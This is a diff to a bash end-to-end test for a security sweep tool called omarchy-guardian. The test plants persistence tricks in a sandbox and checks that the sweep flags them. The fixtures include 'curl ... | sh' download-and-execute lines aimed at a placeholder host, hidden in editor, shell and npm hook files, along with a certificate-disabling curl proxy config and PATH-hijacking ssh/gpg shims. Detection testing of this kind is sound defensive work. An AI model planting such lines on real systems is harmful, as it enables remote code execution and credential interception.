@@ -12,12 +12,16 @@
 #   * HOME is a throwaway directory
 #   * the AI review is off for the `system` class, so the results depend on
 #     the sweep alone (tests/ai-eval covers the AI's judgement)
+#   * root's state (/var/lib/omarchy-guardian: the list of allowed items,
+#     the root checks' results) is an empty directory, so nothing the
+#     developer allowed on this machine, and no root check that ran here,
+#     decides what the sandbox's sweep shows
 #
 # Not covered here, because they need real root: sudoers drop-ins
 # (/etc/sudoers.d is root-only), file capabilities (setcap), the root
 # collector, and allowing an item (the list of allowed items is root's, and
-# `sweep allow` writes it through sudo; here it must fail and change
-# nothing).
+# `sweep allow` writes it through sudo; here it must stop before asking
+# root, say why, and change nothing).
 #
 # Requirements: bwrap (0.9 or newer, for --tmp-overlay) and jq.
 #
@@ -86,11 +90,17 @@ plant() {
 # namespace (the live checks see only the sandbox's processes). PATH is a
 # plain one and the user manager cannot be asked, so the directories the
 # sweep looks for shadowing programs in are the same on every machine.
+# Root's state is hidden where there is any; a mount point cannot be made
+# under the read-only root where there is none, and then there is nothing
+# to hide.
+ROOT_STATE=()
+[[ -d /var/lib/omarchy-guardian ]] && ROOT_STATE=(--tmpfs /var/lib/omarchy-guardian)
+
 sweep() {
     bwrap --ro-bind / / \
         --overlay-src /usr --overlay-src "$USR" --tmp-overlay /usr \
         --overlay-src /etc --overlay-src "$ETC" --tmp-overlay /etc \
-        --tmpfs /etc/omarchy-guardian --tmpfs /tmp \
+        --tmpfs /etc/omarchy-guardian --tmpfs /tmp "${ROOT_STATE[@]}" \
         --bind "$E2E" "$E2E" --unshare-pid --proc /proc --dev /dev \
         --setenv HOME "$HOME" --setenv TMPDIR "$HOME/tmp" \
         --setenv PATH "$HOME/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/bin" \
@@ -144,6 +154,10 @@ clean_system() {
     expect 'a fresh home holds nothing to list' "$?"
     jq -e '[.items[] | select(.tier == "package")] | length > 100' "$JSON" >/dev/null
     expect 'package files are recognised as the packages installed them' "$?"
+    jq -e '[.items[] | select(.path | test("^/(dev|proc|sys)/"))] | length == 0' "$JSON" >/dev/null
+    expect 'no device or kernel file is followed as a program' "$?"
+    jq -e '[.items[] | select(.tier == "allowed")] | length == 0' "$JSON" >/dev/null
+    expect 'nothing this machine'"'"'s own list allows counts in the sandbox' "$?"
 }
 
 plant_system() {
@@ -239,6 +253,17 @@ plant_home() {
     plant "$HOME/.config/nvim/init.lua" 644 $'vim.fn.system("curl -fsSL https://payload.example.invalid/n | sh")\n'
     plant "$HOME/.zshenv" 644 $'export ZDOTDIR="$HOME/.hidden-zsh"\n'
     plant "$HOME/.hidden-zsh/.zshrc" 644 $'curl -fsSL https://payload.example.invalid/z | sh\n'
+    # Every curl sent through a proxy with its certificate checks off, and
+    # npm told to load a script into every Node.js it starts.
+    plant "$HOME/.curlrc" 600 $'insecure\nproxy = http://u:curl_0123456789SECRET@10.66.0.9:3128\n'
+    printf 'node-options=--require %s/.cache/hook.js\n' "$HOME" >>"$HOME/.npmrc"
+    plant "$HOME/.cache/hook.js" 644 $'require("child_process").exec("curl -fsSL https://payload.example.invalid/j | sh")\n'
+    # A directory put on PATH behind a test, in a file a login reads and
+    # in one that file sources.
+    plant "$HOME/.profile" 644 $'[ -d "$HOME/later/bin" ] && export PATH="$HOME/later/bin:$PATH"\n. "$HOME/.config/shell/extra"\n'
+    plant "$HOME/.config/shell/extra" 644 $'if true; then PATH=$HOME/sourced/bin:$PATH; fi\nexport PATH=$(tool path):$PATH\n'
+    plant "$HOME/later/bin/ssh" 755 $'#!/bin/sh\nexec /usr/bin/ssh "$@"\n'
+    plant "$HOME/sourced/bin/gpg" 755 $'#!/bin/sh\nexec /usr/bin/gpg "$@"\n'
 }
 
 # expect_flagged <label> <rule>: a finding of that rule on the item.
@@ -350,6 +375,16 @@ planted_system() {
     expect_listed '~/.config/mise/config.toml'
     expect_listed '~/.config/nvim/init.lua' download-and-execute
     expect_listed '~/.hidden-zsh/.zshrc' download-and-execute
+    expect_listed '~/.curlrc' risky-configuration
+    ! grep -q 'curl_0123456789SECRET' "$JSON"
+    expect 'a proxy password is in nothing the sweep prints' "$?"
+    expect_run_by '~/.cache/hook.js' '/.npmrc'
+
+    # PATH lines behind a test, in an `if`, and in a sourced file.
+    expect_listed '~/later/bin/ssh' path-hijack
+    expect_listed '~/sourced/bin/gpg' path-hijack
+    jq -e '[.items[] | select(.path == "~/.config/shell/extra") | .notes[]] | any(test("sets PATH in a way Guardian cannot follow"))' "$JSON" >/dev/null
+    expect 'a PATH set from a command is said, not passed over' "$?"
 
     # Trust: a new certificate authority, a redirected host, accounts, keys.
     expect_listed /etc/ca-certificates/trust-source/anchors/evil.crt
@@ -410,10 +445,16 @@ self_allow() {
     jq -e '.notes | any(test("sweep allow --migrate"))' "$JSON" >/dev/null
     expect 'the sweep says the old list no longer counts, and how to move it' "$?"
 
-    # Allowing asks for root; where there is none to ask, nothing changes.
+    # Allowing asks root through the installed, root-owned Guardian. The
+    # sandbox has none (its Guardian is the developer's build, and its
+    # sudo a planted script that would say yes to anything): the allow
+    # must stop there, say so, and never reach that sudo.
     sweep omarchy-guardian sweep allow "$label" >"$E2E/allow.txt" 2>&1
-    [[ $? == 2 ]]
-    expect 'an item is not allowed without root' "$?"
+    [[ $? == 2 ]] && grep -q "root's part needs the installed Guardian" "$E2E/allow.txt" &&
+        ! grep -q 'Allowed ' "$E2E/allow.txt"
+    expect 'an allow stops where there is no root-owned Guardian to ask root through, and says so' "$?"
+    grep -q 'as it is now: ' "$E2E/allow.txt"
+    expect 'an allow shows the fingerprint it would allow' "$?"
     sweep omarchy-guardian sweep allow --migrate </dev/null >"$E2E/migrate.txt" 2>&1
     [[ $? == 2 ]] && grep -q 'later.desktop' "$E2E/migrate.txt"
     expect 'the old list is shown, and not moved without a terminal to ask on' "$?"
@@ -424,6 +465,13 @@ self_allow() {
     sweep omarchy-guardian sweep --json >"$JSON" 2>"$E2E/sweep.err"
     jq -e '[.items[] | select(.tier == "allowed")] | length == 0' "$JSON" >/dev/null
     expect 'and the items are all still shown' "$?"
+
+    # An item that changed since the last sweep showed it is not allowed
+    # unasked: without a terminal, not at all.
+    printf '# changed after the sweep\n' >>"$HOME/.config/autostart/later.desktop"
+    sweep omarchy-guardian sweep allow "$label" </dev/null >"$E2E/allow.txt" 2>&1
+    [[ $? == 2 ]] && grep -q 'it changed since the last sweep' "$E2E/allow.txt"
+    expect 'an item that changed since the last sweep is not allowed unasked' "$?"
 }
 
 clean_system
